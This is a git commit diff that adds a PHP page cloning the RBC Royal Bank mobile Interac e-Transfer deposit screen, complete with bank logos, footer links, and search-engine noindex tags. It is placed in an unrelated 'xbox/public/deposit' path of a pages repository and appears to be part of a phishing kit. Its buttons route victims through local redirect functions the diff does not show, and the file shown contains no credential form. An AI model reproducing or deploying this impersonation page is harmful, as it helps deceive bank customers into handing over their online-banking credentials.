92170ae8e460d903f392c669c095117479ed6b5a
fkyrsftj <132077319+fkyrsftj@users.noreply.github.com>
2023-04-30 17:06:33 -0700

    ya

---
+++ .pages/xbox/public/deposit/rbc/index.php
@@ -0,0 +1,79 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"
+	class="ui-mobile">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<!--<script type="text/javascript" async="" src="./js/inpage_linkid.js" id="undefined"></script>-->
+<!--<script type="text/javascript" async="" src="./js/dc.js"></script>-->
+<!--<script src="./js/ztOSCUD9HVck3tcav2Qmpw((.js"></script>-->
+<!--<script src="./js/vi-S4ZV0KAM1TqnzADi3Mw((.js"></script>-->
+<!--<base href="http://www.rbcroyalbank.com/mobile/personal/index.html">-->
+<base href=".">
+<!--<script type="text/javascript" async="" src="./js/iE-e8tjEXoM_KpyvaIA14w((.js"></script>-->
+<!--<script src="./js/serverComponent.php"></script>-->
+<meta charset="utf-8">
+<meta name="ROBOTS" content="NOINDEX, NOFOLLOW">
+<meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=0.65, minimum-scale=0.50, maximum-scale=0.80">
+<!-- <meta name="viewport" id="metaViewport" content="width=device-width, user-scalable=no, initial-scale=0.50, minimum-scale=0.50, maximum-scale=0.50, target-densityDpi=device-dpi"> -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<title>RBC Royal Bank Mobile</title>
+
+<link href="./styles/mobile-phone-ip-an.css" type="text/css" rel="stylesheet">
+<link href="./styles/jquery.mobile-1.2.0.min.css" type="text/css" rel="stylesheet" >
+
+<script src="./js/jquery-1.8.2.min.js"></script>
+<script src="./js/jquery.mobile-1.2.0.js"></script>
+<script src="./js/jquery-util.js"></script>
+<!--
+<script src="./js/mobile.js"></script>
+<script src="./js/cookie.js"></script>
+<script src="./js/iscroll.js"></script>-->
+</head>
+<body class="ui-mobile-viewport ui-overlay-c">
+
+	<div data-role="page" id="home"
+		class="master-wpr ui-page ui-body-c ui-page-active" data-url="home"
+		tabindex="0" style="min-height: 600px;">
+		<!-- *** Mobile Header Start *** -->
+		<div id="mobile-header">
+			<span id="logo"><img src="./images/logo-en.png" height="60" alt="RBC Logo"></span>
+		</div>
+		<div id="mobile-sub-header">
+			<span id="sub-logo"><img src="./images/int-en.png" height="47" alt="Interac e-Transfer Logo"></span>
+		</div>
+		<!-- *** Mobile Header End *** -->
+
+		<div id="mobile-content">
+			<div id="mobile-content-text">How would you like to deposit your Interac e-Transfer?</div>
+		</div>
+
+		<a href="javascript:$.launchIPhoneApp()"
+						id="download-link" class="ui-link"><div id="mobile-app-btn">
+			<p class="btn-text">RBC Mobile</p>
+		</div></a>
+
+		<a	href="javascript:$.redirectToOLBeTransfer('en')" id="nothanks-link" class="ui-link"><div id="online-banking-btn">
+			<p class="btn-text">RBC Online Banking</p>
+		</div></a>
+
+		<div id="app-store-wrapper">
+			<div id="app-store-text">If you don’t have the latest version of the RBC Mobile App, you can download it here:</div>
+			<div id="app-store-logo"><span id="app-store-img"><a href="https://itunes.apple.com/ca/app/rbc-mobile/id407597290?mt=8"><img src="./images/ios-app-str.png" height="46" alt="App Store Logo and Link to download RBC Mobile App."/></a></div>
+		</div>
+
+		<div id="footer-wrapper">
+			<p>Royal Bank of Canada © 1995-<script>document.write(new Date().getFullYear());</script></p>
+			<p><a href="http://www.rbc.com/privacysecurity/ca/" target="_blank" class="ui-link" title="Privacy and Security (Opens new window)">Privacy & Security  &nbsp; </a><img src="../rbc/images/link.png" height="9" alt=""/></p>
+			<p><a href="http://www.rbc.com/legal/" target="_blank" class="ui-link" title="Legal (Opens new window)">Legal  &nbsp;</a> <img src="../rbc/images/link.png" height="9" alt=""/></p>
+			<p><a href="http://www.rbc.com/accessibility/" target="_blank" class="ui-link" title="Accessibility (Opens new window) Link">Accessibility  &nbsp; </a><img src="../rbc/images/link.png" height="9" alt=""/></p>
+		</div>
+
+
+
+	
+		
+		
+	</div>
+
+</body>
+</html>
